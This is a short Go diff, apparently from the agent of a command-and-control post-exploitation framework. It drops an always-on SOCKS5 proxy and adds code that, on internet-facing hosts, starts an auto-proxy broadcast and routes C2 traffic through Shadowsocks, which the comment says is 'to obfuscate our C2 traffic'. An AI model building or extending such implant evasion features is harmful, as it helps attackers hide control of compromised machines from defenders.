@@ -238,22 +238,6 @@ test_agent:
 		}
 	}
 
-	// socks5 proxy
-	go func() {
-		// start a socks5 proxy
-		err := agent.Socks5Proxy("on", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
-		if err != nil {
-			log.Printf("Socks5Proxy on %s: %v", agent.RuntimeConfig.ProxyPort, err)
-			return
-		}
-		defer func() {
-			err := agent.Socks5Proxy("off", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
-			if err != nil {
-				log.Printf("Socks5Proxy off (%s): %v", agent.RuntimeConfig.ProxyPort, err)
-			}
-		}()
-	}()
-
 	// do we have internet?
 	checkInternet := func(cnt *int) bool {
 		if tun.HasInternetAccess() {
@@ -261,7 +245,13 @@ test_agent:
 			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
-				go agent.StartBroadcast(true, ctx, cancel)
+				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature
+
+				if agent.RuntimeConfig.UseShadowsocks {
+					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
+					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s", agent.RuntimeConfig.ShadowsocksPort)
+					go agent.ShadowsocksC2Client()
+				}
 			}
 			return true
 
